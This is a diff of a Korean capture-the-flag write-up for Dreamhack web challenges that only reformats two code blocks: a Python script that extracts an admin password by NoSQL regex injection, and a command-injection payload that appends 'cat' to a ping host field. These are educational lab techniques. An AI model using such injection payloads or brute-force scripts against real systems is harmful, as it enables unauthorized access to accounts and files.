@@ -215,24 +215,24 @@ db.collection('user').findOne({
 
 성공적으로 `admin`이 출력되는 것을 확인하였다. 이후 `upw`의 정규식 패턴 뒤에 임의 문자를 하나씩 추가해 가며 정확한 문자열을 순차적으로 찾을 수 있다. 이를 수행하기 위해 다음과 같은 Python 스크립트를 작성하였다.
 
-<pre><code class="language-python hljs" data-highlighted="yes"><span class="hljs-comment"># mango.py</span>
-
-<span class="hljs-keyword">import</span> requests
-
-alphanumeric = <span class="hljs-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
-url = <span class="hljs-string">"http://host1.dreamhack.games:14943/login"</span>
-query = <span class="hljs-string">"?uid[$regex]=^adm&amp;upw[$regex]=^..{"</span>
-str = <span class="hljs-string">""</span>
-
-<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):
-  <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> alphanumeric:
-    res = requests.get(url + query + str + char)
-    <span class="hljs-keyword">if</span> <span class="hljs-string">"admin"</span> <span class="hljs-keyword">in</span> res.text:
-      str += char
-      <span class="hljs-keyword">break</span>
-
-<span class="hljs-built_in">print</span>(<span class="hljs-string">"flag: DH{" + str + "}"</span>)
-</code></pre>
+<pre><code class="language-python hljs" data-highlighted="yes"><data class="code-line" value="1"><span class="hljs-comment"># mango.py</span>
+</data><data class="code-line" value="2">
+</data><data class="code-line" value="3"><span class="hljs-keyword">import</span> requests
+</data><data class="code-line" value="4">
+</data><data class="code-line" value="5">alphanumeric = <span class="hljs-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
+</data><data class="code-line" value="6">url = <span class="hljs-string">"http://host1.dreamhack.games:14943/login"</span>
+</data><data class="code-line" value="7">query = <span class="hljs-string">"?uid[$regex]=^adm&amp;upw[$regex]=^..{"</span>
+</data><data class="code-line" value="8">str = <span class="hljs-string">""</span>
+</data><data class="code-line" value="9">
+</data><data class="code-line" value="10"><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):
+</data><data class="code-line" value="11" style="--indent: 2ch;">  <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> alphanumeric:
+</data><data class="code-line" value="12" style="--indent: 4ch;">    res = requests.get(url + query + str + char)
+</data><data class="code-line" value="13" style="--indent: 4ch;">    <span class="hljs-keyword">if</span> <span class="hljs-string">"admin"</span> <span class="hljs-keyword">in</span> res.text:
+</data><data class="code-line" value="14" style="--indent: 6ch;">      str += char
+</data><data class="code-line" value="15" style="--indent: 6ch;">      <span class="hljs-keyword">break</span>
+</data><data class="code-line" value="16">
+</data><data class="code-line" value="17"><span class="hljs-built_in">print</span>(<span class="hljs-string">"flag: DH{" + str + "}"</span>)
+</data></code></pre>
 
 ![Write-Up](/data/Dreamhack%20Wargames%20|%20Web%20Hacking%20II/30.png)
 
@@ -270,12 +270,12 @@ Command Injection을 통해 플래그를 획득하는 문제이므로, 우선 �
 
 플래그는 `flag.py`에 존재하므로, 해당 파일의 내용을 읽기 위해 다음 페이로드를 입력하였다.
 
-<pre><code class="language-bash hljs" data-highlighted="yes"><span class="hljs-comment"># host</span>
-8.8.8.8"; cat "flag.py
-
-<span class="hljs-comment"># cmd</span>
-<span class="hljs-built_in">ping</span> -c 3 <span class="hljs-string">"8.8.8.8"</span>; <span class="hljs-built_in">cat</span> <span class="hljs-string">"flag.py"</span>
-</code></pre>
+<pre><code class="language-bash hljs" data-highlighted="yes"><data class="code-line" value="1"><span class="hljs-comment"># host</span>
+</data><data class="code-line" value="2">8.8.8.8"; cat "flag.py
+</data><data class="code-line" value="3">
+</data><data class="code-line" value="4"><span class="hljs-comment"># cmd</span>
+</data><data class="code-line" value="5"><span class="hljs-built_in">ping</span> -c 3 <span class="hljs-string">"8.8.8.8"</span>; <span class="hljs-built_in">cat</span> <span class="hljs-string">"flag.py"</span>
+</data></code></pre>
 
 페이로드 입력 후 `Ping!` 버튼을 클릭하면 다음과 같은 경고문이 출력된다.
 
